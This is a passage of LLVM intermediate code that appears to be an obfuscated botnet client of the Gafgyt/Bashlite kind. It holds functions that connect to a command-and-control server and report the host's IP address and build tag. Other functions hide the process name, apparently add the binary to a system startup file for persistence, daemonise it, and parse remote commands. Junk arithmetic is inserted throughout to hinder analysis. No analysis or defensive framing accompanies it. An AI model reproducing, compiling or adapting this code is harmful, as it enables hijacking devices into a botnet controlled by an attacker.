; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add nsw i32 %11, 1
  %17 = sext i32 %15 to i64
  %18 = icmp eq i64 %17, 1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %26

; <label>:20:                                     ; preds = %10
  %21 = load i32, i32* @currentServer, align 4
  %22 = add i32 %21, -1095252794
  %23 = add i32 %22, 1
  %24 = sub i32 %23, -1095252794
  %25 = add nsw i32 %21, 1
  store i32 %24, i32* @currentServer, align 4
  br label %26

; <label>:26:                                     ; preds = %20, %19
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %28 = load i32, i32* @currentServer, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [1 x i8*], [1 x i8*]* @PromServer, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcpy(i8* %27, i8* %31) #2
  store i32 27, i32* %3, align 4
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = icmp ne i8* %34, null
  br i1 %35, label %36, label %43

; <label>:36:                                     ; preds = %26
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  %39 = getelementptr inbounds i8, i8* %38, i64 1
  %40 = call i32 @atoi(i8* %39) #10
  store i32 %40, i32* %3, align 4
  %41 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %42 = call i8* @strchr(i8* %41, i32 58) #10
  store i8 0, i8* %42, align 1
  br label %43

; <label>:43:                                     ; preds = %36, %26
  %44 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %44, i32* @mainCommSock, align 4
  %45 = load i32, i32* @mainCommSock, align 4
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %47 = load i32, i32* %3, align 4
  %48 = call i32 @connectTimeout(i32 %45, i8* %46, i32 %47, i32 30)
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

; <label>:50:                                     ; preds = %43
  store i32 1, i32* %1, align 4
  br label %52

; <label>:51:                                     ; preds = %43
  store i32 0, i32* %1, align 4
  br label %52

; <label>:52:                                     ; preds = %51, %50
  %53 = load i32, i32* %1, align 4
  ret i32 %53
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.538, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.539, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.540, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.541, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, -1
  %50 = and i32 -227270578, %49
  %51 = xor i32 -227270578, -1
  %52 = and i32 %47, %51
  %53 = xor i32 %48, -1
  %54 = and i32 %53, -227270578
  %55 = and i32 %48, %51
  %56 = or i32 %50, %52
  %57 = or i32 %54, %55
  %58 = xor i32 %56, %57
  %59 = xor i32 %47, %48
  call void @srand(i32 %58) #2
  %60 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %61 = call i32 @getpid() #2
  %62 = xor i32 %60, -1
  %63 = and i32 -1366441040, %62
  %64 = xor i32 -1366441040, -1
  %65 = and i32 %60, %64
  %66 = xor i32 %61, -1
  %67 = and i32 %66, -1366441040
  %68 = and i32 %61, %64
  %69 = or i32 %63, %65
  %70 = or i32 %67, %68
  %71 = xor i32 %69, %70
  %72 = xor i32 %60, %61
  call void @init_rand(i32 %71)
  store i32 0, i32* %10, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.543, i32 0, i32 0), i8** %12, align 8
  %73 = load i8*, i8** %12, align 8
  %74 = call %struct._IO_FILE* @fopen(i8* %73, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store %struct._IO_FILE* %74, %struct._IO_FILE** %13, align 8
  %75 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %76 = icmp eq %struct._IO_FILE* %75, null
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %2
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i32 0, i32 0), i8** %12, align 8
  %78 = load i8*, i8** %12, align 8
  %79 = call %struct._IO_FILE* @fopen(i8* %78, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store %struct._IO_FILE* %79, %struct._IO_FILE** %13, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %2
  %81 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %82 = icmp ne %struct._IO_FILE* %81, null
  br i1 %82, label %83, label %176

; <label>:83:                                     ; preds = %80
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 0
  %86 = load i8*, i8** %85, align 8
  %87 = call i64 @strlen(i8* %86) #10
  %88 = trunc i64 %87 to i32
  store i32 %88, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %89 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %90 = call i8* @getcwd(i8* %89, i64 256) #2
  %91 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %92 = call i32 @strcmp(i8* %91, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i32 0, i32 0)) #10
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %172

; <label>:94:                                     ; preds = %83
  br label %95

; <label>:95:                                     ; preds = %105, %94
  %96 = load i8**, i8*** %5, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 0
  %98 = load i8*, i8** %97, align 8
  %99 = load i32, i32* %16, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %98, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = icmp ne i32 %103, 47
  br i1 %104, label %105, label %111

; <label>:105:                                    ; preds = %95
  %106 = load i32, i32* %16, align 4
  %107 = sub i32 %106, -871052002
  %108 = add i32 %107, -1
  %109 = add i32 %108, -871052002
  %110 = add nsw i32 %106, -1
  store i32 %109, i32* %16, align 4
  br label %95

; <label>:111:                                    ; preds = %95
  %112 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %113 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %114 = load i8**, i8*** %5, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 0
  %116 = load i8*, i8** %115, align 8
  %117 = load i32, i32* %16, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  %120 = call i32 (i8*, i8*, ...) @sprintf(i8* %112, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.547, i32 0, i32 0), i8* %113, i8* %119) #2
  br label %121

; <label>:121:                                    ; preds = %150, %111
  %122 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %123 = call i32 @feof(%struct._IO_FILE* %122) #2
  %124 = icmp ne i32 %123, 0
  %125 = xor i1 %124, true
  %126 = and i1 false, %125
  %127 = xor i1 false, true
  %128 = and i1 %124, %127
  %129 = xor i1 true, true
  %130 = and i1 %129, false
  %131 = and i1 true, %127
  %132 = or i1 %126, %128
  %133 = or i1 %130, %131
  %134 = xor i1 %132, %133
  %135 = xor i1 %124, true
  br i1 %134, label %136, label %151

; <label>:136:                                    ; preds = %121
  %137 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %138 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %139 = call i8* @fgets(i8* %137, i32 1024, %struct._IO_FILE* %138)
  %140 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %141 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %142 = call i32 @strcasecmp(i8* %140, i8* %141) #10
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %150, label %144

; <label>:144:                                    ; preds = %136
  %145 = load i32, i32* %17, align 4
  %146 = sub i32 %145, 1988778807
  %147 = add i32 %146, 1
  %148 = add i32 %147, 1988778807
  %149 = add nsw i32 %145, 1
  store i32 %148, i32* %17, align 4
  br label %150

; <label>:150:                                    ; preds = %144, %136
  br label %121

; <label>:151:                                    ; preds = %121
  %152 = load i32, i32* %17, align 4
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %154, label %168

; <label>:154:                                    ; preds = %151
  %155 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %156 = call i32 @fclose(%struct._IO_FILE* %155)
  %157 = load i8*, i8** %12, align 8
  %158 = call %struct._IO_FILE* @fopen(i8* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.548, i32 0, i32 0))
  store %struct._IO_FILE* %158, %struct._IO_FILE** %18, align 8
  %159 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %160 = icmp ne %struct._IO_FILE* %159, null
  br i1 %160, label %161, label %167

; <label>:161:                                    ; preds = %154
  %162 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %163 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %164 = call i32 @fputs(i8* %162, %struct._IO_FILE* %163)
  %165 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %166 = call i32 @fclose(%struct._IO_FILE* %165)
  br label %167

; <label>:167:                                    ; preds = %161, %154
  br label %171

; <label>:168:                                    ; preds = %151
  %169 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %170 = call i32 @fclose(%struct._IO_FILE* %169)
  br label %171

; <label>:171:                                    ; preds = %168, %167
  br label %175

; <label>:172:                                    ; preds = %83
  %173 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %174 = call i32 @fclose(%struct._IO_FILE* %173)
  br label %175

; <label>:175:                                    ; preds = %172, %171
  br label %176

; <label>:176:                                    ; preds = %175, %80
  %177 = call i32 @getOurIP()
  %178 = call i32 @fork() #2
  store i32 %178, i32* %7, align 4
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %180, label %183

; <label>:180:                                    ; preds = %176
  %181 = load i32, i32* %7, align 4
  %182 = call i32 @waitpid(i32 %181, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:183:                                    ; preds = %176
  %184 = load i32, i32* %7, align 4
  %185 = icmp ne i32 %184, 0
  br i1 %185, label %198, label %186

; <label>:186:                                    ; preds = %183
  %187 = call i32 @fork() #2
  store i32 %187, i32* %8, align 4
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %189, label %190

; <label>:189:                                    ; preds = %186
  call void @exit(i32 0) #14
  unreachable

; <label>:190:                                    ; preds = %186
  %191 = load i32, i32* %8, align 4
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %194, label %193

; <label>:193:                                    ; preds = %190
  br label %196

; <label>:194:                                    ; preds = %190
  %195 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0))
  br label %196

; <label>:196:                                    ; preds = %194, %193
  br label %197

; <label>:197:                                    ; preds = %196
  br label %200

; <label>:198:                                    ; preds = %183
  %199 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.549, i32 0, i32 0))
  br label %200

; <label>:200:                                    ; preds = %198, %197
  br label %201

; <label>:201:                                    ; preds = %200
  %202 = call i32 @setsid() #2
  %203 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i32 0, i32 0)) #2
  %204 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %205

; <label>:205:                                    ; preds = %558, %208, %201
  %206 = call i32 @initConnection()
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %208, label %210

; <label>:208:                                    ; preds = %205
  %209 = call i32 @sleep(i32 30)
  br label %205

; <label>:210:                                    ; preds = %205
  %211 = load i32, i32* @mainCommSock, align 4
  %212 = call i8* @getBuild()
  %213 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %214 = call i8* @inet_ntoa(i32 %213) #2
  %215 = call i32 (i32, i8*, ...) @sockprintf(i32 %211, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.550, i32 0, i32 0), i8* %212, i8* %214)
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  br label %216

; <label>:216:                                    ; preds = %557, %463, %377, %329, %210
  %217 = load i32, i32* @mainCommSock, align 4
  %218 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %219 = call i32 @recvLine(i32 %217, i8* %218, i32 4096)
  store i32 %219, i32* %20, align 4
  %220 = icmp ne i32 %219, -1
  br i1 %220, label %221, label %558

; <label>:221:                                    ; preds = %216
  store i32 0, i32* %21, align 4
  br label %222

; <label>:222:                                    ; preds = %315, %221
  %223 = load i32, i32* %21, align 4
  %224 = sext i32 %223 to i64
  %225 = load i64, i64* @numpids, align 8
  %226 = icmp ult i64 %224, %225
  br i1 %226, label %227, label %320

; <label>:227:                                    ; preds = %222
  %228 = load i32*, i32** @pids, align 8
  %229 = load i32, i32* %21, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds i32, i32* %228, i64 %230
  %232 = load i32, i32* %231, align 4
  %233 = call i32 @waitpid(i32 %232, i32* null, i32 1)
  %234 = icmp sgt i32 %233, 0
  br i1 %234, label %235, label %314

; <label>:235:                                    ; preds = %227
  %236 = load i32, i32* %21, align 4
  %237 = add i32 %236, 344239581
  %238 = add i32 %237, 1
  %239 = sub i32 %238, 344239581
  %240 = add nsw i32 %236, 1
  store i32 %239, i32* %23, align 4
  br label %241

; <label>:241:                                    ; preds = %260, %235
  %242 = load i32, i32* %23, align 4
  %243 = zext i32 %242 to i64
  %244 = load i64, i64* @numpids, align 8
  %245 = icmp ult i64 %243, %244
  br i1 %245, label %246, label %266

; <label>:246:                                    ; preds = %241
  %247 = load i32*, i32** @pids, align 8
  %248 = load i32, i32* %23, align 4
  %249 = zext i32 %248 to i64
  %250 = getelementptr inbounds i32, i32* %247, i64 %249
  %251 = load i32, i32* %250, align 4
  %252 = load i32*, i32** @pids, align 8
  %253 = load i32, i32* %23, align 4
  %254 = add i32 %253, -132289286
  %255 = sub i32 %254, 1
  %256 = sub i32 %255, -132289286
  %257 = sub i32 %253, 1
  %258 = zext i32 %256 to i64
  %259 = getelementptr inbounds i32, i32* %252, i64 %258
  store i32 %251, i32* %259, align 4
  br label %260

; <label>:260:                                    ; preds = %246
  %261 = load i32, i32* %23, align 4
  %262 = add i32 %261, -711956222
  %263 = add i32 %262, 1
  %264 = sub i32 %263, -711956222
  %265 = add i32 %261, 1
  store i32 %264, i32* %23, align 4
  br label %241

; <label>:266:                                    ; preds = %241
  %267 = load i32*, i32** @pids, align 8
  %268 = load i32, i32* %23, align 4
  %269 = add i32 %268, 1202985465
  %270 = sub i32 %269, 1
  %271 = sub i32 %270, 1202985465
  %272 = sub i32 %268, 1
  %273 = zext i32 %271 to i64
  %274 = getelementptr inbounds i32, i32* %267, i64 %273
  store i32 0, i32* %274, align 4
  %275 = load i64, i64* @numpids, align 8
  %276 = sub i64 0, %275
  %277 = sub i64 0, -1
  %278 = add i64 %276, %277
  %279 = sub i64 0, %278
  %280 = add i64 %275, -1
  store i64 %279, i64* @numpids, align 8
  %281 = load i64, i64* @numpids, align 8
  %282 = add i64 %281, 8900588046050101407
  %283 = add i64 %282, 1
  %284 = sub i64 %283, 8900588046050101407
  %285 = add i64 %281, 1
  %286 = mul i64 %284, 4
  %287 = call noalias i8* @malloc(i64 %286) #2
  %288 = bitcast i8* %287 to i32*
  store i32* %288, i32** %22, align 8
  store i32 0, i32* %23, align 4
  br label %289

; <label>:289:                                    ; preds = %304, %266
  %290 = load i32, i32* %23, align 4
  %291 = zext i32 %290 to i64
  %292 = load i64, i64* @numpids, align 8
  %293 = icmp ult i64 %291, %292
  br i1 %293, label %294, label %310

; <label>:294:                                    ; preds = %289
  %295 = load i32*, i32** @pids, align 8
  %296 = load i32, i32* %23, align 4
  %297 = zext i32 %296 to i64
  %298 = getelementptr inbounds i32, i32* %295, i64 %297
  %299 = load i32, i32* %298, align 4
  %300 = load i32*, i32** %22, align 8
  %301 = load i32, i32* %23, align 4
  %302 = zext i32 %301 to i64
  %303 = getelementptr inbounds i32, i32* %300, i64 %302
  store i32 %299, i32* %303, align 4
  br label %304

; <label>:304:                                    ; preds = %294
  %305 = load i32, i32* %23, align 4
  %306 = sub i32 %305, 634010681
  %307 = add i32 %306, 1
  %308 = add i32 %307, 634010681
  %309 = add i32 %305, 1
  store i32 %308, i32* %23, align 4
  br label %289

; <label>:310:                                    ; preds = %289
  %311 = load i32*, i32** @pids, align 8
  %312 = bitcast i32* %311 to i8*
  call void @free(i8* %312) #2
  %313 = load i32*, i32** %22, align 8
  store i32* %313, i32** @pids, align 8
  br label %314

; <label>:314:                                    ; preds = %310, %227
  br label %315

; <label>:315:                                    ; preds = %314
  %316 = load i32, i32* %21, align 4
  %317 = sub i32 0, 1
  %318 = sub i32 %316, %317
  %319 = add nsw i32 %316, 1
  store i32 %318, i32* %21, align 4
  br label %222

; <label>:320:                                    ; preds = %222
  %321 = load i32, i32* %20, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %322
  store i8 0, i8* %323, align 1
  %324 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %324)
  %325 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %326 = call i8* @strstr(i8* %325, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0)) #10
  %327 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %328 = icmp eq i8* %326, %327
  br i1 %328, label %329, label %332

; <label>:329:                                    ; preds = %320
  %330 = load i32, i32* @mainCommSock, align 4
  %331 = call i32 (i32, i8*, ...) @sockprintf(i32 %330, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.551, i32 0, i32 0))
  br label %216

; <label>:332:                                    ; preds = %320
  %333 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %334 = call i8* @strstr(i8* %333, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.552, i32 0, i32 0)) #10
  %335 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %336 = icmp eq i8* %334, %335
  br i1 %336, label %337, label %348

; <label>:337:                                    ; preds = %332
  %338 = load i32, i32* %10, align 4
  %339 = sub i32 %338, 622992885
  %340 = add i32 %339, 1
  %341 = add i32 %340, 622992885
  %342 = add nsw i32 %338, 1
  store i32 %341, i32* %10, align 4
  %343 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.553, i32 0, i32 0))
  %344 = load i32, i32* %10, align 4
  %345 = icmp sgt i32 %344, 20
  br i1 %345, label %346, label %347

; <label>:346:                                    ; preds = %337
  call void @exit(i32 0) #14
  unreachable

; <label>:347:                                    ; preds = %337
  br label %558

; <label>:348:                                    ; preds = %332
  %349 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %349, i8** %24, align 8
  %350 = load i8*, i8** %24, align 8
  %351 = load i8, i8* %350, align 1
  %352 = zext i8 %351 to i32
  %353 = icmp eq i32 %352, 33
  br i1 %353, label %354, label %557

; <label>:354:                                    ; preds = %348
  %355 = load i8*, i8** %24, align 8
  %356 = getelementptr inbounds i8, i8* %355, i64 1
  store i8* %356, i8** %25, align 8
  br label %357

; <label>:357:                                    ; preds = %369, %354
